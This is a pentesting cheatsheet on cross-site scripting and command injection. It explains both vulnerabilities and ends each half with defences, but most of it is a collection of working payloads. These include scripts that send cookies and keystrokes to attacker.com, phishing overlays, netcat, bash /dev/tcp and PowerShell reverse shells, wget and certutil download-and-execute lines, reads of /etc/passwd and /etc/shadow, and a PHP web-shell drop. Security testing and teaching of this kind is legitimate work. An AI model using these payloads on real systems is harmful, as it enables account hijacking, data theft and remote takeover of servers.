# XSS (Cross-Site Scripting) and Command Injection Cheatsheet

This cheatsheet covers common techniques, use cases, and payloads for Cross-Site Scripting (XSS) and Command Injection, two prevalent web application vulnerabilities.

## Table of Contents

* [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
    * [Understanding XSS](#understanding-xss)
    * [Types of XSS](#types-of-xss)
        * [Reflected XSS](#reflected-xss)
        * [Stored XSS (Persistent XSS)](#stored-xss-persistent-xss)
        * [DOM-based XSS](#dom-based-xss)
    * [Common XSS Payloads](#common-xss-payloads)
    * [XSS Bypasses](#xss-bypasses)
    * [XSS Use Cases (What can an attacker do?)](#xss-use-cases-what-can-an-attacker-do)
    * [XSS Prevention (Important for Testers to Know)](#xss-prevention-important-for-testers-to-know)
* [Command Injection](#command-injection)
    * [Understanding Command Injection](#understanding-command-injection)
    * [Command Injection Payloads](#command-injection-payloads)
    * [Command Injection Blind Techniques](#command-injection-blind-techniques)
    * [Command Injection Use Cases](#command-injection-use-cases)
    * [Command Injection Prevention (Important for Testers to Know)](#command-injection-prevention-important-for-testers-to-know)

---

## XSS (Cross-Site Scripting)

### Understanding XSS

XSS is a type of security vulnerability that enables attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users. When a victim loads the affected page, the malicious script executes within their browser, operating under the victim's privileges and within the context of the vulnerable website.

**Impact of XSS:**
* **Session Hijacking**: Stealing user cookies/session tokens to impersonate the victim.
* **Defacing Websites**: Altering the content of a web page.
* **Redirecting Users**: Forcing users to malicious websites.
* **Phishing**: Displaying fake login forms to steal credentials.
* **Malware Distribution**: Triggering drive-by downloads.
* **Data Exfiltration**: Stealing sensitive data displayed on the page.

### Types of XSS

#### Reflected XSS

* **Explanation**: The injected script is reflected off the web server, typically in an error message, search result, or any other response that includes some or all of the input sent by the user. The payload is not permanently stored.
* **Use Case**: Often delivered via a malicious link (e.g., in a phishing email) that, when clicked, executes the script in the victim's browser.
* **Example Scenario**: A search function that reflects user input directly into the HTML without sanitization.
    * **Vulnerable URL**: `http://example.com/search?query=<script>alert('XSS')</script>`
    * **Server Response (Snippet)**: `<p>You searched for: <script>alert('XSS')</script></p>`

#### Stored XSS (Persistent XSS)

* **Explanation**: The injected script is permanently stored on the target server (e.g., in a database, forum post, comment section, user profile). When other users visit the affected page, the malicious script is retrieved from the server and executed in their browser.
* **Use Case**: Highly dangerous as it affects all users who view the compromised content without requiring direct interaction with a malicious link.
* **Example Scenario**: A forum where users can post comments.
    * **Attacker Posts**: `<p>Hello world! <script>alert(document.cookie)</script></p>`
    * **Stored in Database**: `Hello world! <script>alert(document.cookie)</script>`
    * **Victim Views Page**: The script executes every time the comment is loaded.

#### DOM-based XSS

* **Explanation**: The vulnerability lies in the client-side code (JavaScript) that processes data from an untrustworthy source, such as the URL fragment (`#...`), and writes it to the DOM without proper sanitization. The server never sees the malicious payload.
* **Use Case**: Exploiting client-side JavaScript that dynamically manipulates the DOM using user-controlled data (e.g., from `document.URL`, `location.hash`, `document.referrer`).
* **Example Scenario**: A JavaScript function that reads `location.hash` and writes it to an element.
    * **Vulnerable JavaScript**: `var s = document.getElementById('id').innerHTML = location.hash;`
    * **Vulnerable URL**: `http://example.com/page.html#<img src=x onerror=alert(1)>`
    * **Browser Action**: The browser executes `alert(1)` when the image fails to load.

### Common XSS Payloads

* **Basic Alert (Proof of Concept)**:
    * `<script>alert(1)</script>`
    * `<script>alert('XSS')</script>`
    * `<img src=x onerror=alert(1)>`
    * `<svg onload=alert(1)>`
    * `<body onload=alert(1)>`
    * `<iframe src="javascript:alert(1)"></iframe>`

* **Cookie Stealing**:
    * `<script>document.location='http://attacker.com/log.php?c='+document.cookie</script>`

* **HTML Injection / Phishing**:
    * `<script>document.body.innerHTML='<h1>You have been logged out. Please re-enter credentials:</h1><form>Username:<input type=text><br>Password:<input type=password></form>'</script>`

* **Keylogger**:
    * `<script>document.onkeypress = function(e){ fetch('http://attacker.com/log.php?key='+e.key); }</script>`

* **Redirect**:
    * `<script>window.location.href='http://malicious.com'</script>`

### XSS Bypasses

* **Case Sensitivity**:
    * `<sCrIpT>alert(1)</sCrIpT>`
* **Filtering `script` tags**: Use other tags or events.
    * `<img src=x onerror=alert(1)>`
    * `<body onload=alert(1)>`
    * `<svg onload=alert(1)>`
    * `<details open ontoggle=alert(1)>`
    * `<video><source onerror="alert(1)">`
* **Filtering parentheses `()`**: Use backticks for `alert`.
    * `<img src=x onerror=alert`1`>`
* **Filtering quotes `"` `'`**:
    * `<img src=x onerror=alert(document.cookie)>` (if no quotes needed)
    * `<svg onload=alert&lpar;1&rpar;>` (HTML entities)
* **Double Encoded Input**: If input is URL decoded twice.
    * `%253Cscript%253Ealert(1)%253C/script%253E` (becomes `<script>alert(1)</script>`)
* **Null Bytes**:
    * `<img src="x%00" onerror="alert(1)">`
* **Removing Spaces**: Use `/` or newlines.
    * `<img/src=x%0Aonerror=alert(1)>`
* **Non-Alphanumeric**: For contexts like `eval()`.
    * `[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+([][[]]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+[][[]])[+[]]+(!![]+[])[!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]][([][[]]+[])[+!+[]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]])()` becomes `alert(1)`

### XSS Use Cases (What can an attacker do?)

* **Cookie Exfiltration**:
    * `javascript:void(fetch('http://attacker.com/cookie.php?data=' + document.cookie))`
* **Defacement**:
    * `<script>document.body.innerHTML = '<h1>Hacked By Attacker!</h1>';</script>`
* **Redirect to Phishing Site**:
    * `<script>window.location.replace('http://malicious-phishing-site.com');</script>`
* **Keylogging (via JS)**:
    * `<script>document.addEventListener('keypress', function(e) { fetch('http://attacker.com/log?key=' + e.key); });</script>`
* **AJAX Requests within Victim's Session**:
    * `<script>var xhr = new XMLHttpRequest(); xhr.open('GET', '/sensitive/data', true); xhr.send(null);</script>`
* **Port Scanning from Client Browser**:
    * A more advanced technique involving JS and WebSockets/WebRTC to scan internal network ports accessible from the victim's browser.
* **Malware Download**:
    * `<script>window.location.href='http://attacker.com/malware.exe'</script>` (initiates download)

### XSS Prevention (Important for Testers to Know)

* **Output Encoding/Escaping**: The most critical defense. Convert user-controlled input into a safe format before rendering it in HTML.
    * **HTML Entity Encoding**: For data within HTML content. Convert `<`, `>`, `&`, `"`, `'` to `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`.
    * **JavaScript String Escaping**: For data within `<script>` blocks or JavaScript event handlers.
    * **URL Encoding**: For data within URLs.
    * **CSS Escaping**: For data within CSS.
* **Content Security Policy (CSP)**: A powerful HTTP response header that whitelists trusted sources of content (scripts, styles, images, etc.). This significantly mitigates XSS by restricting what scripts can run.
    * `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`
* **Input Validation**: Although not a primary defense against XSS (encoding is), validating input can help prevent malformed data from reaching the output stage.
* **HTTPOnly Flag for Cookies**: Prevents client-side scripts from accessing cookies, mitigating session hijacking even if XSS occurs.
* **Secure Coding Practices**: Avoid writing dynamic JavaScript that directly inserts user input into the DOM using `innerHTML` or `document.write`. Use `textContent` or `innerText` where possible.
* **WAF (Web Application Firewall)**: Can detect and block common XSS attack patterns, but should not be the sole defense.

---

## Command Injection

### Understanding Command Injection

Command Injection is an attack in which the goal is the execution of arbitrary commands on the host operating system via a vulnerable application. This occurs when an application passes unsanitized user-supplied input to a system shell.

**Impact of Command Injection:**
* **Remote Code Execution (RCE)**: Full control over the server.
* **Data Exfiltration**: Reading sensitive files (e.g., `/etc/passwd`, configuration files).
* **Privilege Escalation**: Running commands as a more privileged user.
* **Denial of Service**: Shutting down services or deleting critical files.
* **Establishing Backdoors**: Creating new user accounts, installing malware.

### Command Injection Payloads

Attackers use various shell metacharacters to inject commands. The effectiveness depends on the underlying OS (Windows/Linux) and the shell used.

* **Linux/Unix-like Systems (Bash, Sh, etc.)**:
    * **`&` (AND operator)**: Executes command regardless of previous command's success.
        * `cmd=ls & id`
    * **`&&` (Conditional AND)**: Executes command only if previous command succeeds.
        * `cmd=ls && id`
    * **`|` (Pipe)**: Output of first command becomes input of second.
        * `cmd=echo test | id`
    * **`||` (Conditional OR)**: Executes command only if previous command fails.
        * `cmd=false || id`
    * **`;` (Command Separator)**: Executes multiple commands sequentially.
        * `cmd=ls ; id`
    * **`` ` `` (Backticks)**: Command substitution; output of command inside backticks is treated as part of the outer command.
        * `cmd=echo `id``
    * **`$(command)` (Command Substitution)**: Similar to backticks, often preferred.
        * `cmd=echo $(id)`
    * **Newline characters (`%0a`, `\n`)**: If input is read line by line.
        * `cmd=ls%0a cat /etc/passwd`

* **Windows Systems (Cmd.exe)**:
    * **`&`**: `cmd=dir & whoami`
    * **`&&`**: `cmd=dir && whoami`
    * **`|`**: `cmd=echo hello | whoami`
    * **`||`**: `cmd=false || whoami`
    * **`;`**: Not generally a command separator in cmd.exe for this purpose, but sometimes works. Use `&` or `&&` instead.
    * **`%0a` (Newline)**: `cmd=dir%0a whoami`
    * **`^` (Escape character)**: Can be used to escape special characters if filtering is applied.
        * `cmd=dir ^& whoami`

* **Payload Examples:**
    * **Basic command execution**:
        * `cmd=; ls -la /`
        * `cmd=; cat /etc/passwd`
        * `cmd=; type C:\Windows\win.ini`
    * **Reverse Shell (Linux - Netcat)**:
        * `cmd=; nc -e /bin/sh <attacker_ip> <port>`
        * `cmd=; bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`
    * **Reverse Shell (Windows - PowerShell)**:
        * `cmd=; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
    * **Download and Execute**:
        * `cmd=; wget http://attacker.com/malicious.sh -O /tmp/s.sh; bash /tmp/s.sh` (Linux)
        * `cmd=; certutil.exe -urlcache -f -split http://attacker.com/malicious.exe C:\temp\malicious.exe; C:\temp\malicious.exe` (Windows)

### Command Injection Blind Techniques

Similar to Blind SQLi, if there's no direct output, observe side-effects.

* **Time-based Delay**:
    * `cmd=; sleep 5` (Linux)
    * `cmd=; timeout /t 5` (Windows)
    * `cmd=; ping -n 5 127.0.0.1` (Windows)
* **Out-of-Band Interaction (DNS/HTTP request)**:
    * `cmd=; ping -c 1 <subdomain>.attacker.com` (Linux - triggers DNS lookup)
    * `cmd=; nslookup <subdomain>.attacker.com` (Windows - triggers DNS lookup)
    * `cmd=; wget http://attacker.com/test` (Linux - triggers HTTP request)
    * `cmd=; powershell -c "Invoke-WebRequest -Uri http://attacker.com/test"` (Windows - triggers HTTP request)
* **Error-based (less common, but possible)**: Craft commands that would cause an error message that might be displayed.

### Command Injection Use Cases

* **Remote Server Control**: Gaining a shell on the target system.
* **Sensitive File Access**: Reading `/etc/shadow`, `/etc/nginx/nginx.conf`, database credentials, etc.
* **Network Enumeration**: `ip a`, `ifconfig`, `netstat -tulnp`.
* **User/Privilege Enumeration**: `whoami`, `id`, `cat /etc/sudoers`.
* **Data Exfiltration**: Using `curl` or `wget` to send sensitive data to an external server.
* **Web Shell Deployment**: Writing a simple web shell to a web-accessible directory.
    * `cmd=; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php`

### Command Injection Prevention (Important for Testers to Know)

* **Avoid Calling External Commands**: If possible, use safer, language-specific APIs instead of directly executing system commands (e.g., use built-in functions for file operations rather than `ls` or `cat`).
* **Input Validation (Whitelisting)**: The most effective defense. Only allow known good characters and reject all others. Define a strict set of allowed characters and patterns. Do not blacklist.
    * **Example**: If an input should only be a filename, validate that it contains only alphanumeric characters, underscores, and hyphens, and no directory traversal (`../`) sequences.
* **Sanitization/Escaping**: If external commands *must* be used, carefully escape or sanitize any user-supplied input that is passed to the command. Each shell (Bash, Cmd.exe, PowerShell) has different escaping rules. This is complex and error-prone.
* **Least Privilege**: The application user running the commands should have the absolute minimum necessary permissions on the operating system.
* **Disable Dangerous Functions**: Disable or restrict functions known to be problematic if not strictly necessary (e.g., `exec()`, `shell_exec()`, `system()` in PHP; `java.lang.Runtime.exec()` in Java; `subprocess.call()` in Python).
* **Environment Variables**: Carefully manage environment variables used by external commands.
* **Secure Deployment**: Run applications in containers (Docker, Kubernetes) or chrooted environments to limit the impact of a compromise.
* **WAF (Web Application Firewall)**: Can help detect and block common command injection patterns.